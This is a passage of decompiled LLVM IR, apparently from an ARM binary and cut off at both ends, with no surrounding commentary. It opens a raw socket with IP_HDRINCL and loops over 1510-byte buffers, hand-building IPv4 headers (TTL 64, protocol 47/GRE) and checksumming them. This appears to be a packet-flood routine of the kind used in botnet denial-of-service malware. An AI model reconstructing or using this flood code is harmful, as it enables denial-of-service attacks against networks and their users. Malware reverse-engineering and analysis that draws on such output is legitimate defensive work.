  %v3_b160 = call i32 @function_13f90(i32 2, i32 3, i32 6)
  store i32 %v3_b160, i32* %r0.global-to-local, align 4
  %v7_b164 = icmp eq i32 %v3_b160, -1
  store i1 %v7_b164, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b164, label %dec_label_pc_b5e4, label %dec_label_pc_b170

dec_label_pc_b170:                                ; preds = %dec_label_pc_b00c
  store i32 1, i32* %stack_var_-40, align 4
  %v6_b178 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v6_b178, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v6_b18c = call i32 @function_13f60(i32 %v3_b160, i32 0, i32 3, i32* nonnull %stack_var_-40, i32 4)
  store i32 %v6_b18c, i32* %r0.global-to-local, align 4
  %v7_b190 = icmp eq i32 %v6_b18c, -1
  store i1 %v7_b190, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b190, label %dec_label_pc_b5dc, label %dec_label_pc_b198

dec_label_pc_b198:                                ; preds = %dec_label_pc_b170
  %v0_b198 = load i32, i32* @sl, align 4
  %v0_b1a4 = load i32, i32* @r8, align 4
  %v3_b1a4 = mul i32 %v0_b1a4, 65536
  store i32 %v3_b1a4, i32* %r8.global-to-local, align 4
  %v0_b1a8 = load i32, i32* @r7, align 4
  %v0_b1ac = load i32, i32* @r6, align 4
  %v1_b1ac = urem i32 %v0_b1ac, 256
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_b1b4 = urem i32 %v0_b198, 65536
  store i32 %v3_b1b4, i32* %r2.global-to-local, align 4
  %v3_b1b8 = urem i32 %v0_b1a4, 65536
  store i32 %v3_b1b8, i32* %r3.global-to-local, align 4
  %v0_b1bc = load i32, i32* @fp, align 4
  %v2_b1bc = icmp eq i32 %v0_b1bc, 0
  store i1 %v2_b1bc, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  %v3_b1cc = urem i32 %v0_b1a8, 65536
  store i32 %v3_b1cc, i32* @sl, align 4
  %tmp84 = icmp slt i32 %v0_b1bc, 1
  br i1 %tmp84, label %dec_label_pc_b708, label %dec_label_pc_b1dc

dec_label_pc_b1dc:                                ; preds = %dec_label_pc_b198
  %v3_b1e0 = mul i32 %v5_b0f8, 65536
  %v1_b1e4 = add i32 %v3_b1e0, 3407872
  %v3_b1ec = udiv i32 %v1_b1e4, 256
  %v0_b1a8.not = or i32 %v0_b1a8, -65536
  %v1_b1fc = xor i32 %v0_b1a8.not, 65535
  %v1_b200 = urem i32 %v0_b1a4, 256
  %tmp85 = mul nsw i32 %v1_b1fc, 256
  %v1_b218 = and i32 %v3_b1ec, 65280
  %v1_b21c = add i32 %v3_b1e0, 524288
  %v4_b220 = udiv i32 %v1_b1e4, 16777216
  %v5_b220 = or i32 %v1_b218, %v4_b220
  store i32 %v5_b220, i32* %r0.global-to-local, align 4
  %v1_b224 = add i32 %v3_b1e0, 1835008
  %v1_b22c = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  store i32 %v1_b22c, i32* @lr, align 4
  %tmp86 = udiv i32 %v1_b1fc, 256
  %tmp87 = udiv i32 %v0_b1a8, 256
  %v5_b240 = trunc i32 %tmp86 to i8
  %tmp88 = udiv i32 %v0_b198, 256
  %sext29 = mul i32 %tmp87, 16777216
  %v4_b260 = sdiv i32 %sext29, 16777216
  %v3_b26c = mul nuw nsw i32 %v1_b200, 256
  store i32 %v3_b26c, i32* @r5, align 4
  %v3_b270 = udiv i32 %v1_b21c, 256
  %tmp89 = udiv i32 %v0_b1a4, 256
  %v4_b278 = urem i32 %tmp89, 256
  %v5_b278 = or i32 %v4_b278, %v3_b26c
  store i32 %v5_b278, i32* @r7, align 4
  %v3_b27c = ashr i32 %sext29, 31
  %v3_b288 = sdiv i32 %v1_b224, 16777216
  %v1_b28c = and i32 %v3_b270, 65280
  store i32 %v1_b28c, i32* @r6, align 4
  %sext30 = mul i32 %tmp88, 16777216
  %v4_b294 = sdiv i32 %sext30, 16777216
  %v3_b298 = ashr i32 %v1_b224, 31
  %v3_b29c = udiv i32 %v1_b1fc, 65536
  %v4_b2a0 = udiv i32 %v1_b21c, 16777216
  %v5_b2a0 = or i32 %v1_b28c, %v4_b2a0
  store i32 %v5_b2a0, i32* %r8.global-to-local, align 4
  %v3_b2ac = ashr i32 %sext30, 31
  store i32 %v3_b2ac, i32* %r1.global-to-local, align 4
  store i32 %v1_b200, i32* %r2.global-to-local, align 4
  %v3_b2b441 = udiv i32 %v1_b28c, 256
  store i32 %v3_b2b441, i32* %r3.global-to-local, align 4
  %v5_b2bc = trunc i32 %v3_b2ac to i8
  store i32 0, i32* @r4, align 4
  %v4_b318 = sext i8 %v5_b09c to i32
  %sext = mul i32 %v1_b1e4, 256
  %v4_b320 = sdiv i32 %sext, 16777216
  %sext16 = mul nuw i32 %v4_b220, 16777216
  %v4_b330 = sdiv i32 %sext16, 16777216
  %v2_b404 = icmp eq i32 %v1_b1ac, 0
  %sext20 = mul i32 %v1_b21c, 256
  %v4_b424 = sdiv i32 %sext20, 16777216
  %sext21 = mul i32 %v0_b1a4, 16777216
  %v7_b43c = sdiv i32 %sext21, 16777216
  %v1_b32c = trunc i32 %v4_b320 to i8
  br label %dec_label_pc_b2cc

dec_label_pc_b2cc:                                ; preds = %bb96, %dec_label_pc_b1dc
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_b2d8 = call i32 @function_14294(i32 1510, i32 4)
  store i32 %v2_b2d8, i32* %r0.global-to-local, align 4
  store i32 %v2_b02c, i32* %r1.global-to-local, align 4
  %v3_b2e0 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v2_b2e4 = load i32, i32* @r4, align 4
  %v5_b2e4 = mul i32 %v2_b2e4, 4
  %v6_b2e4 = add i32 %v5_b2e4, %v2_b02c
  %v7_b2e4 = inttoptr i32 %v6_b2e4 to i32*
  store i32 %v2_b2d8, i32* %v7_b2e4, align 4
  %v0_b2e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b2e8 = load i32, i32* %r3.global-to-local, align 4
  %v4_b2e8 = mul i32 %v1_b2e8, 4
  %v5_b2e8 = add i32 %v4_b2e8, %v0_b2e8
  %v6_b2e8 = inttoptr i32 %v5_b2e8 to i32*
  %v7_b2e8 = load i32, i32* %v6_b2e8, align 4
  store i32 %v7_b2e8, i32* %r4.global-to-local, align 4
  %v1_b2ec = inttoptr i32 %v7_b2e8 to i8*
  %v2_b2ec = load i8, i8* %v1_b2ec, align 1
  %tmp = urem i8 %v2_b2ec, 16
  %v1_b2f0 = zext i8 %tmp to i32
  %v1_b2f4 = or i32 %v1_b2f0, 64
  store i32 %v1_b2f4, i32* %r2.global-to-local, align 4
  %v1_b2f8 = trunc i32 %v1_b2f4 to i8
  store i8 %v1_b2f8, i8* %v1_b2ec, align 1
  %v0_b2fc = load i32, i32* %r4.global-to-local, align 4
  %v1_b2fc = inttoptr i32 %v0_b2fc to i8*
  %v2_b2fc = load i8, i8* %v1_b2fc, align 1
  %v1_b300 = and i8 %v2_b2fc, -16
  %v1_b304 = or i8 %v1_b300, 5
  store i32 %v1_b0ac, i32* %r2.global-to-local, align 4
  store i8 %v1_b304, i8* %v1_b2fc, align 1
  %v2_b314 = load i32, i32* %r4.global-to-local, align 4
  %v3_b314 = add i32 %v2_b314, 1
  %v4_b314 = inttoptr i32 %v3_b314 to i8*
  store i8 %v5_b064, i8* %v4_b314, align 1
  store i32 %v4_b318, i32* %r1.global-to-local, align 4
  %v2_b31c = load i32, i32* %r4.global-to-local, align 4
  %v3_b31c = add i32 %v2_b31c, 8
  %v4_b31c = inttoptr i32 %v3_b31c to i8*
  store i8 %v5_b09c, i8* %v4_b31c, align 1
  store i32 %v4_b320, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_b328 = load i32, i32* %r2.global-to-local, align 4
  %v9_b328 = icmp eq i32 %v0_b328, 0
  store i1 %v9_b328, i1* %cpsr_z.global-to-local, align 1
  %v2_b32c = load i32, i32* %r4.global-to-local, align 4
  %v3_b32c = add i32 %v2_b32c, 3
  %v4_b32c = inttoptr i32 %v3_b32c to i8*
  store i8 %v1_b32c, i8* %v4_b32c, align 1
  store i32 %v4_b330, i32* %r2.global-to-local, align 4
  %v0_b334 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b334, label %.thread23, label %.thread

.thread:                                          ; preds = %dec_label_pc_b2cc
  %v1_b334 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v1_b334, i32* %r3.global-to-local, align 4
  %v2_b338 = trunc i32 %v1_b334 to i8
  %v3_b338 = load i32, i32* %r4.global-to-local, align 4
  %v4_b338 = add i32 %v3_b338, 7
  %v5_b338 = inttoptr i32 %v4_b338 to i8*
  store i8 %v2_b338, i8* %v5_b338, align 1
  %v0_b33c.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b33c.pr.pr, label %.thread23, label %bb

bb:                                               ; preds = %.thread
  store i32 64, i32* %r3.global-to-local, align 4
  %v3_b340 = load i32, i32* %r4.global-to-local, align 4
  %v4_b340 = add i32 %v3_b340, 6
  %v5_b340 = inttoptr i32 %v4_b340 to i8*
  store i8 64, i8* %v5_b340, align 1
  br label %.thread23

.thread23:                                        ; preds = %dec_label_pc_b2cc, %.thread, %bb
  %v0_b344 = load i32, i32* %r2.global-to-local, align 4
  %v1_b344 = trunc i32 %v0_b344 to i8
  %v2_b344 = load i32, i32* %r4.global-to-local, align 4
  %v3_b344 = add i32 %v2_b344, 2
  %v4_b344 = inttoptr i32 %v3_b344 to i8*
  store i8 %v1_b344, i8* %v4_b344, align 1
  store i32 %v3_b27c, i32* %r2.global-to-local, align 4
  store i32 %v4_b260, i32* %r1.global-to-local, align 4
  %v2_b354 = load i32, i32* %r4.global-to-local, align 4
  %v3_b354 = add i32 %v2_b354, 9
  %v4_b354 = inttoptr i32 %v3_b354 to i8*
  store i8 47, i8* %v4_b354, align 1
  %v0_b358 = load i32, i32* %r2.global-to-local, align 4
  %v1_b358 = trunc i32 %v0_b358 to i8
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = add i32 %v2_b358, 5
  %v4_b358 = inttoptr i32 %v3_b358 to i8*
  store i8 %v1_b358, i8* %v4_b358, align 1
  %v3_b35c = load i32, i32* %stack_var_-40, align 4
  %v5_b364 = mul i32 %v3_b35c, 24
  store i32 %v5_b364, i32* %r3.global-to-local, align 4
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  %v1_b36c = load i32, i32* %r4.global-to-local, align 4
  %v2_b36c = add i32 %v1_b36c, 12
  %v3_b36c = inttoptr i32 %v2_b36c to i32*
  store i32 %v5_b14c, i32* %v3_b36c, align 4
  %v0_b370 = load i32, i32* %r3.global-to-local, align 4
  %v1_b370 = load i32, i32* @sb, align 4
  %v2_b370 = add i32 %v1_b370, %v0_b370
  store i32 %v2_b370, i32* %r3.global-to-local, align 4
  %v0_b374 = load i32, i32* %r1.global-to-local, align 4
  %v1_b374 = trunc i32 %v0_b374 to i8
  %v2_b374 = load i32, i32* %r4.global-to-local, align 4
  %v3_b374 = add i32 %v2_b374, 4
  %v4_b374 = inttoptr i32 %v3_b374 to i8*
  store i8 %v1_b374, i8* %v4_b374, align 1
  %v0_b378 = load i32, i32* %r3.global-to-local, align 4
  %v1_b378 = add i32 %v0_b378, 16
  %v2_b378 = inttoptr i32 %v1_b378 to i32*
  %v3_b378 = load i32, i32* %v2_b378, align 4
  store i32 %v3_b378, i32* %r2.global-to-local, align 4
  %v0_b37c = load i32, i32* %r4.global-to-local, align 4
  %v1_b37c = add i32 %v0_b37c, 20
  store i32 %v1_b37c, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_b384 = load i32, i32* %r0.global-to-local, align 4
  %v1_b384 = trunc i32 %v0_b384 to i8
  %v3_b384 = add i32 %v0_b37c, 23
  %v4_b384 = inttoptr i32 %v3_b384 to i8*
  store i8 %v1_b384, i8* %v4_b384, align 1
  %v0_b388 = load i32, i32* %r3.global-to-local, align 4
  %v1_b388 = trunc i32 %v0_b388 to i8
  %v2_b388 = load i32, i32* %r1.global-to-local, align 4
  %v3_b388 = add i32 %v2_b388, 2
  %v4_b388 = inttoptr i32 %v3_b388 to i8*
  store i8 %v1_b388, i8* %v4_b388, align 1
  %v0_b38c = load i32, i32* %r4.global-to-local, align 4
  %v1_b38c = add i32 %v0_b38c, 24
  %v2_b38c = inttoptr i32 %v1_b38c to i8*
  %v3_b38c = load i8, i8* %v2_b38c, align 1
  %tmp104 = urem i8 %v3_b38c, 16
  %v1_b390 = zext i8 %tmp104 to i32
  %v1_b394 = or i32 %v1_b390, 64
  store i32 %v1_b394, i32* %r3.global-to-local, align 4
  %v1_b398 = trunc i32 %v1_b394 to i8
  store i8 %v1_b398, i8* %v2_b38c, align 1
  %v0_b39c = load i32, i32* %r2.global-to-local, align 4
  %v1_b39c = load i32, i32* %r4.global-to-local, align 4
  %v2_b39c = add i32 %v1_b39c, 16
  %v3_b39c = inttoptr i32 %v2_b39c to i32*
  store i32 %v0_b39c, i32* %v3_b39c, align 4
  %v0_b3a0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3a0 = add i32 %v0_b3a0, 24
  %v2_b3a0 = inttoptr i32 %v1_b3a0 to i8*
  %v3_b3a0 = load i8, i8* %v2_b3a0, align 1
  %v1_b3a4 = and i8 %v3_b3a0, -16
  %v1_b3a8 = or i8 %v1_b3a4, 5
  store i8 %v1_b3a8, i8* %v2_b3a0, align 1
  %v0_b3b4 = load i32, i32* %r4.global-to-local, align 4
  %v1_b3b4 = add i32 %v0_b3b4, 24
  store i32 %v1_b3b4, i32* @r5, align 4
  %v3_b3b8 = add i32 %v0_b3b4, 25
  %v4_b3b8 = inttoptr i32 %v3_b3b8 to i8*
  store i8 %v5_b064, i8* %v4_b3b8, align 1
  store i32 %v3_b288, i32* %r1.global-to-local, align 4
  store i32 %tmp86, i32* %r3.global-to-local, align 4
  store i32 %v3_b298, i32* %r2.global-to-local, align 4
  %v2_b3c8 = load i32, i32* @r5, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 4
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v5_b240, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = trunc i32 %v0_b3cc to i8
  %v2_b3cc = load i32, i32* @r5, align 4
  %v3_b3cc = add i32 %v2_b3cc, 2
  %v4_b3cc = inttoptr i32 %v3_b3cc to i8*
  store i8 %v1_b3cc, i8* %v4_b3cc, align 1
  %v0_b3d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3d0, label %bb91, label %bb90

bb90:                                             ; preds = %.thread23
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb91

bb91:                                             ; preds = %.thread23, %bb90
  store i32 %v3_b29c, i32* %r1.global-to-local, align 4
  %v0_b3d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3d8 = trunc i32 %v0_b3d8 to i8
  %v2_b3d8 = load i32, i32* @r5, align 4
  %v3_b3d8 = add i32 %v2_b3d8, 3
  %v4_b3d8 = inttoptr i32 %v3_b3d8 to i8*
  store i8 %v1_b3d8, i8* %v4_b3d8, align 1
  store i32 %v4_b318, i32* %r2.global-to-local, align 4
  %v0_b3e0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3e0, label %bb93, label %bb92

bb92:                                             ; preds = %bb91
  %v1_b3e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_b3e0 = trunc i32 %v1_b3e0 to i8
  %v3_b3e0 = load i32, i32* @r5, align 4
  %v4_b3e0 = add i32 %v3_b3e0, 6
  %v5_b3e0 = inttoptr i32 %v4_b3e0 to i8*
  store i8 %v2_b3e0, i8* %v5_b3e0, align 1
  br label %bb93

bb93:                                             ; preds = %bb91, %bb92
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_b3e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_b3e8 = trunc i32 %v0_b3e8 to i8
  %v2_b3e8 = load i32, i32* @r5, align 4
  %v3_b3e8 = add i32 %v2_b3e8, 5
  %v4_b3e8 = inttoptr i32 %v3_b3e8 to i8*
  store i8 %v1_b3e8, i8* %v4_b3e8, align 1
  %v0_b3ec = load i32, i32* %r2.global-to-local, align 4
  %v1_b3ec = trunc i32 %v0_b3ec to i8
  %v2_b3ec = load i32, i32* @r5, align 4
  %v3_b3ec = add i32 %v2_b3ec, 8
  %v4_b3ec = inttoptr i32 %v3_b3ec to i8*
  store i8 %v1_b3ec, i8* %v4_b3ec, align 1
  %v0_b3f0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_b3f0, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_b3f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_b3f0 = trunc i32 %v1_b3f0 to i8
  %v3_b3f0 = load i32, i32* @r5, align 4
  %v4_b3f0 = add i32 %v3_b3f0, 7
  %v5_b3f0 = inttoptr i32 %v4_b3f0 to i8*
  store i8 %v2_b3f0, i8* %v5_b3f0, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  %v0_b3f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3f4 = trunc i32 %v0_b3f4 to i8
  %v2_b3f4 = load i32, i32* @r5, align 4
  %v3_b3f4 = add i32 %v2_b3f4, 9
  %v4_b3f4 = inttoptr i32 %v3_b3f4 to i8*
  store i8 %v1_b3f4, i8* %v4_b3f4, align 1
  %v0_b3f8 = call i32 @function_fe60()
  store i32 %v0_b3f8, i32* %r0.global-to-local, align 4
  store i32 %v1_b1ac, i32* %r1.global-to-local, align 4
  store i1 %v2_b404, i1* %cpsr_z.global-to-local, align 1
  %v1_b408 = sub i32 1023, %v0_b3f8
  store i32 %v1_b408, i32* %r3.global-to-local, align 4
  br i1 %v2_b404, label %.thread24, label %.thread25

.thread24:                                        ; preds = %bb95
  %v2_b410 = load i32, i32* @r5, align 4
  %v3_b410 = add i32 %v2_b410, 16
  %v4_b410 = inttoptr i32 %v3_b410 to i32*
  store i32 %v1_b408, i32* %v4_b410, align 4
  br label %bb96

.thread25:                                        ; preds = %bb95
  %v1_b40c = load i32, i32* %r4.global-to-local, align 4
  %v2_b40c = add i32 %v1_b40c, 16
  %v3_b40c = inttoptr i32 %v2_b40c to i32*
  %v4_b40c = load i32, i32* %v3_b40c, align 4
  store i32 %v4_b40c, i32* %r3.global-to-local, align 4
  %v2_b414 = load i32, i32* @r5, align 4
  %v3_b414 = add i32 %v2_b414, 16
  %v4_b414 = inttoptr i32 %v3_b414 to i32*
  store i32 %v4_b40c, i32* %v4_b414, align 4
  br label %bb96

bb96:                                             ; preds = %.thread24, %.thread25
  store i32 %v4_b294, i32* %r3.global-to-local, align 4
  %v0_b41c = load i32, i32* %r4.global-to-local, align 4
  %v1_b41c = add i32 %v0_b41c, 44
  store i32 %v1_b41c, i32* @r6, align 4
  %v1_b420 = load i32, i32* @r5, align 4
  %v2_b420 = add i32 %v1_b420, 12
  %v3_b420 = inttoptr i32 %v2_b420 to i32*
  store i32 %v0_b3f8, i32* %v3_b420, align 4
  store i32 %v4_b424, i32* %r2.global-to-local, align 4
  %v0_b428 = load i32, i32* %r3.global-to-local, align 4
  %v1_b428 = trunc i32 %v0_b428 to i8
  %v2_b428 = load i32, i32* @r6, align 4
  %v3_b428 = inttoptr i32 %v2_b428 to i8*
  store i8 %v1_b428, i8* %v3_b428, align 1
  %v3_b42c = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_b42c, i32* %r3.global-to-local, align 4
  %v0_b430 = load i32, i32* %r2.global-to-local, align 4
  %v1_b430 = trunc i32 %v0_b430 to i8
  %v2_b430 = load i32, i32* @r6, align 4
  %v3_b430 = add i32 %v2_b430, 5
  %v4_b430 = inttoptr i32 %v3_b430 to i8*
  store i8 %v1_b430, i8* %v4_b430, align 1
  %v0_b434 = load i32, i32* %r3.global-to-local, align 4
  %v1_b434 = add i32 %v0_b434, 1
  store i32 %v1_b434, i32* @r4, align 4
  store i32 %v3_b2ac, i32* %r1.global-to-local, align 4
  store i32 %v7_b43c, i32* %r2.global-to-local, align 4
  %v1_b440 = load i32, i32* @fp, align 4
  %v9_b440 = icmp eq i32 %v1_b434, %v1_b440
  store i1 %v9_b440, i1* %cpsr_z.global-to-local, align 1
  %v2_b444 = load i32, i32* @r6, align 4
  %v3_b444 = add i32 %v2_b444, 1
  %v4_b444 = inttoptr i32 %v3_b444 to i8*
  store i8 %v5_b2bc, i8* %v4_b444, align 1
  %v0_b448 = load i32, i32* @r7, align 4
  %v1_b448 = trunc i32 %v0_b448 to i8
  %v2_b448 = load i32, i32* @r6, align 4
  %v3_b448 = add i32 %v2_b448, 2
  %v4_b448 = inttoptr i32 %v3_b448 to i8*
  store i8 %v1_b448, i8* %v4_b448, align 1
  %v0_b44c = load i32, i32* %r2.global-to-local, align 4
  %v1_b44c = trunc i32 %v0_b44c to i8
  %v2_b44c = load i32, i32* @r6, align 4
  %v3_b44c = add i32 %v2_b44c, 3
  %v4_b44c = inttoptr i32 %v3_b44c to i8*
  store i8 %v1_b44c, i8* %v4_b44c, align 1
  %v0_b450 = load i32, i32* %r8.global-to-local, align 4
  %v1_b450 = trunc i32 %v0_b450 to i8
  %v2_b450 = load i32, i32* @r6, align 4
  %v3_b450 = add i32 %v2_b450, 4
  %v4_b450 = inttoptr i32 %v3_b450 to i8*
  store i8 %v1_b450, i8* %v4_b450, align 1
  %v0_b454 = load i32, i32* @r4, align 4
  store i32 %v0_b454, i32* %stack_var_-40, align 4
  %v5_b458 = icmp slt i32 %v1_b434, %v1_b440
  br i1 %v5_b458, label %dec_label_pc_b2cc, label %dec_label_pc_b45c

dec_label_pc_b45c:                                ; preds = %bb96
  %v1_b464 = add i32 %v5_b0f8, 8
  store i32 %v1_b464, i32* %r3.global-to-local, align 4
  %v1_b468 = add i32 %v5_b0f8, 52
  store i32 %v1_b468, i32* %r1.global-to-local, align 4
  %v0_b474.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_b474.preheader

dec_label_pc_b474.preheader:                      ; preds = %dec_label_pc_b45c, %dec_label_pc_b708
  %v0_b474.pre = phi i32 [ %v0_b474.pre.pre, %dec_label_pc_b45c ], [ %v0_b1bc, %dec_label_pc_b708 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_b468, %dec_label_pc_b45c ], [ %v1_b714, %dec_label_pc_b708 ]
  %stack_var_-152.0.ph = phi i32 [ %v1_b464, %dec_label_pc_b45c ], [ %v1_b710, %dec_label_pc_b708 ]
  %v2_b6ec = icmp eq i32 %v1_b118, 0
  %v2_b4ec = icmp eq i32 %v1_b1ac, 0
  %v2_b4b8 = icmp eq i32 %v5_b14c, -1
  %v7_b4b8 = icmp eq i32 %v5_b14c, -1
  br label %dec_label_pc_b474

dec_label_pc_b474:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b474.preheader
  %v0_b474 = phi i32 [ %v0_b474.pre, %dec_label_pc_b474.preheader ], [ %v1_b5cc, %dec_label_pc_b508 ]
  %v2_b474 = icmp eq i32 %v0_b474, 0
  store i1 %v2_b474, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp97 = icmp slt i32 %v0_b474, 1
  br label %dec_label_pc_b47c

dec_label_pc_b47c:                                ; preds = %dec_label_pc_b47c, %dec_label_pc_b474
  br i1 %tmp97, label %dec_label_pc_b47c, label %dec_label_pc_b480

dec_label_pc_b480:                                ; preds = %dec_label_pc_b47c
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_b48c

dec_label_pc_b48c:                                ; preds = %dec_label_pc_b508, %dec_label_pc_b480
  %v1_b4a0 = phi i32 [ %v1_b5c8, %dec_label_pc_b508 ], [ 0, %dec_label_pc_b480 ]
  %v5_b490 = mul i32 %v1_b4a0, 24
  %v1_b494 = load i32, i32* @sb, align 4
  %v2_b494 = add i32 %v1_b494, %v5_b490
  store i32 %v2_b494, i32* %r3.global-to-local, align 4
  store i32 %v2_b02c, i32* %r1.global-to-local, align 4
  %v1_b49c = add i32 %v2_b494, 20
  %v2_b49c = inttoptr i32 %v1_b49c to i8*
  %v3_b49c = load i8, i8* %v2_b49c, align 1
  %v4_b49c = zext i8 %v3_b49c to i32
  store i32 %v4_b49c, i32* %r2.global-to-local, align 4
  %v4_b4a0 = mul i32 %v1_b4a0, 4
  %v5_b4a0 = add i32 %v4_b4a0, %v2_b02c
  %v6_b4a0 = inttoptr i32 %v5_b4a0 to i32*
  %v7_b4a0 = load i32, i32* %v6_b4a0, align 4
  store i32 %v7_b4a0, i32* @r5, align 4
  %v7_b4a4 = icmp eq i8 %v3_b49c, 31
  store i1 %v7_b4a4, i1* %cpsr_z.global-to-local, align 1
  %v1_b4a8 = add i32 %v7_b4a0, 24
  store i32 %v1_b4a8, i32* @r6, align 4
  %v1_b4ac = add i32 %v7_b4a0, 44
  store i32 %v1_b4ac, i32* @r7, align 4
  %tmp105 = icmp ult i8 %v3_b49c, 32
  br i1 %tmp105, label %dec_label_pc_b5ec, label %dec_label_pc_b4b4

dec_label_pc_b4b4:                                ; preds = %dec_label_pc_b48c
  store i32 %v5_b14c, i32* %r2.global-to-local, align 4
  store i1 %v7_b4b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b4b8, label %dec_label_pc_b654, label %dec_label_pc_b4c0

dec_label_pc_b4c0:                                ; preds = %dec_label_pc_b5ec, %dec_label_pc_b4b4
  store i32 65535, i32* @r4, align 4
  %v0_b4c8 = load i32, i32* @sl, align 4
  %v9_b4c8 = icmp eq i32 %v0_b4c8, 65535
  store i1 %v9_b4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4c8, label %dec_label_pc_b66c, label %dec_label_pc_b4d0

dec_label_pc_b4d0:                                ; preds = %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge, %dec_label_pc_b4c0
  %v1_b4d4 = phi i32 [ %v1_b4d4.pre, %dec_label_pc_b654.dec_label_pc_b4d0_crit_edge ], [ 65535, %dec_label_pc_b4c0 ]
  store i32 %v3_b1b4, i32* %r3.global-to-local, align 4
  %v9_b4d4 = icmp eq i32 %v3_b1b4, %v1_b4d4
  store i1 %v9_b4d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4d4, label %dec_label_pc_b6a4, label %dec_label_pc_b4dc

dec_label_pc_b4dc:                                ; preds = %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge, %dec_label_pc_b4d0
  %v1_b4e0 = phi i32 [ %v1_b4e0.pre, %dec_label_pc_b66c.dec_label_pc_b4dc_crit_edge ], [ %v1_b4d4, %dec_label_pc_b4d0 ]
  store i32 %v3_b1b8, i32* %r1.global-to-local, align 4
  %v9_b4e0 = icmp eq i32 %v3_b1b8, %v1_b4e0
  store i1 %v9_b4e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_b4e0, label %dec_label_pc_b6c0, label %dec_label_pc_b4e8

dec_label_pc_b4e8:                                ; preds = %dec_label_pc_b6a4, %dec_label_pc_b4dc
  store i32 %v1_b1ac, i32* %r2.global-to-local, align 4
  store i1 %v2_b4ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b4ec, label %dec_label_pc_b6e4, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_b4e8
  %v1_b4f0 = load i32, i32* @r5, align 4
  %v2_b4f0 = add i32 %v1_b4f0, 16
  %v3_b4f0 = inttoptr i32 %v2_b4f0 to i32*
  %v4_b4f0 = load i32, i32* %v3_b4f0, align 4
  store i32 %v4_b4f0, i32* %r3.global-to-local, align 4
  %v2_b4f4 = load i32, i32* @r6, align 4
  %v3_b4f4 = add i32 %v2_b4f4, 16
  %v4_b4f4 = inttoptr i32 %v3_b4f4 to i32*
  store i32 %v4_b4f0, i32* %v4_b4f4, align 4
  br label %dec_label_pc_b4fc

dec_label_pc_b4fc:                                ; preds = %bb102, %.thread26
  store i32 %v1_b118, i32* %r3.global-to-local, align 4
  store i1 %v2_b6ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b6ec, label %dec_label_pc_b508, label %dec_label_pc_b6f8

dec_label_pc_b508:                                ; preds = %dec_label_pc_b4fc, %dec_label_pc_b6e4, %dec_label_pc_b6f8
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b50c = load i32, i32* @r8, align 4
  %v1_b50c = trunc i32 %v0_b50c to i8
  %v2_b50c = load i32, i32* @r5, align 4
  %v3_b50c = add i32 %v2_b50c, 10
  %v4_b50c = inttoptr i32 %v3_b50c to i8*
  store i8 %v1_b50c, i8* %v4_b50c, align 1
  %v0_b510 = load i32, i32* @r8, align 4
  %v1_b510 = trunc i32 %v0_b510 to i8
  %v2_b510 = load i32, i32* @r5, align 4
  %v3_b510 = add i32 %v2_b510, 11
  %v4_b510 = inttoptr i32 %v3_b510 to i8*
  store i8 %v1_b510, i8* %v4_b510, align 1
  %v0_b514 = load i32, i32* @r5, align 4
  store i32 %v0_b514, i32* @r0, align 4
  %v2_b518 = call i32 @function_e424(i32 %v0_b514, i32 20)
  %v3_b518 = trunc i32 %v2_b518 to i8
  %v4_b51c = sdiv i32 %v2_b518, 256
  store i32 %v4_b51c, i32* %r3.global-to-local, align 4
